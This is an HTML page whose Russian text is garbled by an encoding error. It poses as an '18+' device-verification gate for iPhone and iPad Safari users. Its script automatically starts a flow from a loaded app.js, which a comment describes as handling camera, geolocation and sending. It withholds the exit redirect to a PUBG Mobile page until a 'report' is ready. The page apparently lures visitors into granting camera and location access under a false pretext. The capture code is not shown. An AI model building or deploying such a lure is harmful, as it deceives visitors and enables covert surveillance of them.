<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>18+ –í—Ö–æ–¥ ‚Äî –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞</title>
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta name="format-detection" content="telephone=no">

  <!-- ‚úÖ –ê–¥—Ä–µ—Å API -->
  <script>
  // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ç–æ—Ç –∂–µ origin (–¥–æ–º–µ–Ω+–ø—Ä–æ—Ç–æ–∫–æ–ª), –≥–¥–µ –æ—Ç–∫—Ä—ã—Ç —Å–∞–π—Ç.
  // –†–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ onrender.com –∏ –Ω–∞ —Ç–≤–æ–∏—Ö –∫–∞—Å—Ç–æ–º–Ω—ã—Ö –¥–æ–º–µ–Ω–∞—Ö –±–µ–∑ CORS.
  window.__API_BASE = (typeof location !== 'undefined' && location.origin)
    ? location.origin.replace(/\/+$/, '')
    : '';
</script>


  <style>
    :root {
      --bg0:#ffffff;--bg1:#f7f9ff;
      --txt:#111;--sub:#444;--muted:#6b7280;
      --primary:#2563eb;--primary2:#60a5fa;
      --err:#ef4444;--ok:#16a34a;
      --radius:20px;--shadow:0 6px 30px rgba(0,0,0,.08);
      --ring:0 0 0 3px rgba(37,99,235,.25)
    }
    html,body{height:100%}
    body{
      margin:0;overflow:hidden;display:grid;place-items:center;
      font-family:"Segoe UI",Roboto,system-ui,-apple-system,sans-serif;
      background:var(--bg0);color:var(--txt);
      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
    }
    .animated-gradient{
      position:absolute;inset:-12vmax;z-index:0;pointer-events:none;
      filter:blur(80px) saturate(110%);opacity:.35;
      background:conic-gradient(from 0deg,rgba(96,165,250,.20),rgba(14,165,233,.15),rgba(199,210,254,.18),rgba(96,165,250,.20));
      animation:swirl 32s linear infinite
    }
    @keyframes swirl{to{transform:rotate(360deg)}}
    .card{
      width:min(92vw,520px);padding:28px;border-radius:var(--radius);
      background:rgba(255,255,255,.92);backdrop-filter:blur(6px);
      box-shadow:var(--shadow);text-align:center;z-index:2
    }
    h1{font-size:24px;font-weight:800;margin:0 0 12px}
    p{font-size:16px;margin:0 0 18px;line-height:1.55}
    .reason{font-size:13px;margin-top:8px;color:var(--muted)}
    .notice{font-size:12px;color:var(--muted);margin-top:14px}
    button{
      width:100%;height:54px;border:none;border-radius:14px;
      background:linear-gradient(90deg,var(--primary),var(--primary2));
      color:#fff;font-weight:800;font-size:16px;cursor:pointer;
      transition:transform .12s ease,box-shadow .12s ease;
      box-shadow:0 10px 25px rgba(37,99,235,.25)
    }
    .ok{color:var(--ok);font-weight:700}
    .err{color:var(--err);font-weight:700}
  </style>
</head>
<body>
  <div class="animated-gradient" aria-hidden="true"></div>

  <div class="card" id="card">
    <h1 id="title">–ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞</h1>
    <p id="text">–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã‚Ä¶</p>
    <div class="reason" id="reason"></div>
    <button id="enterBtn" style="display:none;">–í–æ–π—Ç–∏ 18+</button>
    <div class="notice" id="note"></div>
  </div>

  <!-- üîí –û—Å–Ω–æ–≤–Ω–æ–π JS (–∫–∞–º–µ—Ä–∞, –≥–µ–æ, –æ—Ç–ø—Ä–∞–≤–∫–∞) -->
  <script src="/app.js?v=6"></script>

  <!-- üîç –°—Ç—Ä–æ–≥–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–ª—å–∫–æ iOS/iPadOS 18+ Safari -->
  <script>
    const MIN_IOS_MAJOR = 18;

    function isIOSFamily() {
      const ua = navigator.userAgent;
      const touchMac = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
      return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
    }

    function parseIOSMajor() {
      const ua = navigator.userAgent;
      const m1 = ua.match(/OS\s(\d+)[._]/);
      if (m1) return parseInt(m1[1], 10);
      const m2 = ua.match(/Version\/(\d+)/);
      if (m2) return parseInt(m2[1], 10);
      return null;
    }

    function isPureSafari() {
      const ua = navigator.userAgent;
      const vendorOK = navigator.vendor === 'Apple Computer, Inc.';
      const hasSafari = /Safari\//.test(ua);
      const hasWebKit = /\bAppleWebKit\/\d+/.test(ua);
      const notSafari = /CriOS|Chrome|Chromium|FxiOS|Firefox|Edg|EdgiOS|OPR|OPiOS|YaBrowser|DuckDuckGo|Brave|UCBrowser/i.test(ua);
      return vendorOK && hasWebKit && hasSafari && !notSafari;
    }

    function secureContextOK() {
      return location.protocol === 'https:' || location.hostname === 'localhost';
    }

    function deviceGateCheck() {
      const isiOS = isIOSFamily();
      const iosMajor = parseIOSMajor();
      const safari = isPureSafari();
      const httpsOK = secureContextOK();

      if (!httpsOK)
        return { ok:false, reason:'–ù—É–∂–µ–Ω HTTPS (–∏–ª–∏ localhost) –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ/–≥–µ–æ.' };
      if (!isiOS)
        return { ok:false, reason:'–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ iOS/iPadOS.' };
      if (iosMajor === null)
        return { ok:false, reason:'–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –≤–µ—Ä—Å–∏—é iOS/iPadOS.' };
      if (iosMajor < MIN_IOS_MAJOR)
        return { ok:false, reason:`–í–µ—Ä—Å–∏—è iOS/iPadOS –Ω–∏–∂–µ ${MIN_IOS_MAJOR}.` };
      if (!safari)
        return { ok:false, reason:'–ë—Ä–∞—É–∑–µ—Ä –Ω–µ Safari (–∏–ª–∏ –ø–æ–¥–º–µ–Ω–∞ User-Agent).' };
      return { ok:true, iosMajor };
    }

    document.addEventListener('DOMContentLoaded', () => {
      const $ = id => document.getElementById(id);
      const res = deviceGateCheck();

      if (res.ok) {
        $('title').textContent = '–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ 18+';
        $('text').innerHTML = '<span class="ok">–î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à—ë–Ω.</span>';
        const platIsIPad = /iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent);
        $('reason').textContent = `${platIsIPad ? 'iPadOS' : 'iOS'} ${res.iosMajor}, Safari WebKit.`;
        $('enterBtn').style.display = 'block';
        $('note').textContent = '–ö–Ω–æ–ø–∫–∞ –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è –ø–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏.';

        if (typeof window.__autoFlow === 'function')
          setTimeout(() => window.__autoFlow(), 100);

        $('enterBtn').addEventListener('click', e => {
          if (!window.__reportReady) { e.preventDefault(); return; }
          // üöÄ —Ä–µ–¥–∏—Ä–µ–∫—Ç –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏
          location.assign('https://www.pubgmobile.com/ig/itop');
        });
      } else {
        $('title').textContent = '–î–æ—Å—Ç—É–ø –æ—Ç–∫–ª–æ–Ω—ë–Ω';
        $('text').innerHTML = '<span class="err">–û—Ç–∫–∞–∑ –≤ –¥–æ—Å—Ç—É–ø–µ.</span>';
        $('reason').textContent = '–ü—Ä–∏—á–∏–Ω–∞: ' + res.reason;
        $('note').textContent = `–î–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ –Ω–∞ iPhone/iPad —Å iOS/iPadOS ${MIN_IOS_MAJOR}+ –∏ Safari.`;
        $('enterBtn').style.display = 'none';
      }
    });
  </script>
</body>
</html>
